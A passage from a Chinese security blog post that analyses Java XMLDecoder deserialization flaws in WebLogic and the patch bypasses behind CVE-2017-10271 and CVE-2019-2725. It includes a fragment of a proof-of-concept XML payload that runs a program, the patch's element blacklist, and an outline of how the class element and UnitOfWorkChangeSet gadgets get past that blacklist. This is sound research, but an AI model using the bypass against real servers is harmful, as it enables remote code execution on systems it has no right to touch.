class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行，弹出计算器<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-02-27.png" alt="">证明我们的理论没问题，我们下断点跟一下<br>在readobject下断点<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-06-50.png" alt=""><br>发现其调用了parsingComplete函数，继续跟入<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-08-42.png" alt=""><br>发现调用了parse函数跟入看一下<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-11-09.png" alt=""><br>这里做了一些权限检查以后跟入<br>SAXParserFactory.newInstance().newSAXParser().parse<br>后面的调用栈比较深，大致是做了一些取xml版本，头信息的操作这里给出一个调用栈图，有兴趣的可以自己跟一下<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-33-34.png" alt=""><br>然后我们来到了关键的地方<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-35-03.png" alt=""><br>注意一下this.handlers参数，这里包含了所有元素对应的解析器<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-38-32.png" alt=""><br>假如这里我们解析的元素是array，所以我们会调用arrayElementHandler的构造函数去实例化一个<code>arrayElementHandler</code>的类对象，然后设置一些属性，在这里我们可以重点看一下<br>this.handler.addAttribute这一步操作也就是如果没有length属性的话则会调用父类也就是newelementhandler的addAttribute方法<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-01-20.png" alt=""><br>这里因为我们的payload是<code>&lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;</code>所以第一属性是class不是length，所以需要调用newelementhandler的addAttribute方法，我们看一下<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-11-34.png" alt=""><br>这里定义了对class属性的处理过程，也就是会返回我们通过class属性的类，ok，看到这里我们再看看object元素的处理<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-15-30.png" alt=""><br>注意这里的object依然继承newelementhandler所以，依然是调用newelement的addAttribute，所以可以获得类，这也证明的new元素本身可以代替class，然后我们再来看看void元素<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-19-23.png" alt=""><br>看到这里我们的疑惑应该解决了，也就是继承了objecthandlerelement或者newhandlerelement的元素可以代替object元素，那有人肯定有疑问为什么我们刚刚提到的array元素不行，其实我们本地测一下就能知道问题出在哪里了，我们获得的class最终会在执行endelement调用对应handler的getValueObject函数进行取值<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-49-58.png" alt=""><br>我们看看不同handler的getValueObject的实现<br>array<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-59-59.png" alt=""><br>object<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_18-00-11.png" alt=""><br>我们可以发现arrayelementhandler是使用Array.newInstance创建array的实例，而不是我们传入的类的实例<br>篇幅有限,这里有没有别的可替代的元素大家可以自行去看一下。<br>然后执行到ValueObjectImpl.create里的getvalue<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_20-35-04.png" alt="">通过反射最终执行代码</p>
+<h2 id="cve-2019-2725"><a href="#cve-2019-2725" class="headerlink" title="cve-2019-2725"></a>cve-2019-2725</h2><p>就在weblogic以为高枕无忧的时候，时隔两年<br>又出了新的绕过方式，我们来看一下最新的补丁<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String attClass = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="keyword">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  String lengthString = attributes.getValue(<span class="string">"length"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br></pre></td></tr></table></figure></p>
+<p>这次重点在于把class元素也禁用了，我们来看一下classelementhandler<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-36-57.png" alt=""><br>这里我们classelementhandler继承的是stringhandler而且我们的类并不是通过属性传入的，所以可以肯定并不是我们之前的方式，但是他有一个很有意思的getValue方法，返回值就是我们传入的类，通过上面的分析，我们在一个元素结束的时候也就是endelement的方法会调用对应handler的getValueObject，这里因为classelementhandler没有getValueObject方法，所以会调用父类的getValueObject方法，也就是会调用stringelementhandler的getValueObject<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-50-20.png" alt=""><br>然后会调用classelementhandler的getValue方法，最终返回对应的类，但是这里有个问题method关键词被ban了所以只能调用该类的构造方法，并且由于array只能传入byte属性，所以我们需要一个类的构造方法接受一个字节数组并且有类似反射或者readobject的敏感操作，网上大多都是通过UnitOfWorkChangeSet这个类进行反序列化操作的<img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_19-20-46.png" alt="">明显满足要求!!!所以接下来可以利用yso的jdk7u21的或者JtaTransactionManager</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>payload太长就不发了，有兴趣的小伙伴可以自行构造，其实xmldecoder反序列化的问题最早在2013年就被提出了，理论上在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险，并且使用黑名单来打补丁的方式始终不太靠谱，期待下一个cve</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/xmldecoder.html" title="xmldecoder反序列化的补丁与绕过">xmldecoder反序列化的补丁与绕过</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/xmldecoder.html" title="xmldecoder反序列化的补丁与绕过">http://pupiles.com/xmldecoder.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2019年5月2日 - 20时05分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> <br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/learning/" rel="tag"><i class="fa fa-tag"></i> learning</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/java_unserialize2.html" rel="next" title="从零开始的JAVA反序列化(二)">
+                <i class="fa fa-chevron-left"></i> 从零开始的JAVA反序列化(二)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg" alt="Pupil">
+          <p class="site-author-name" itemprop="name">Pupil</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		 <br><br>
+         <span id="busuanzi_container_site_uv">
+         <b><span id="busuanzi_value_site_uv"></span></b><br>
+		 <span class="site-state-item-name">访客</span>
+         </span><br><br>
+        </nav>
+
+        
+		
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34609129&auto=0&height=66"></iframe>
+		<div align="left" font-family:="" "arial","microsoft="" yahei","黑体","宋体",sans-serif="">
+		<b><h1>个人简介</h1></b>
+		<p>
+		冻鳗&CTF&代码审计 首陀罗 脚本小子<br>
+    L-Team&Flappypig&r3kapig 饮水机管理员<br>
+		mail：pupiles86@gmail.com
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </p></div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#从cve-2017-3506谈起"><span class="nav-number">1.</span> <span class="nav-text">从cve-2017-3506谈起</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cve-2017-10271"><span class="nav-number">1.1.</span> <span class="nav-text">cve-2017-10271</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cve-2019-2725"><span class="nav-number">2.</span> <span class="nav-text">cve-2019-2725</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pupil</span>
+</div>
+
+
+<div class="powered-by">
+  技术支持By Pupiles
+</div>
+
+<div class="theme-info">
+  博客 -XDSEC
+</div>
+
+
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "70c8d4b1771e4a19bf986d2a1c098b34",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("YQEVdCwfMShMt1vjaRojsYrr-gzGzoHsz", "APOpeTkajaCsoqVKYvcCMWwt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
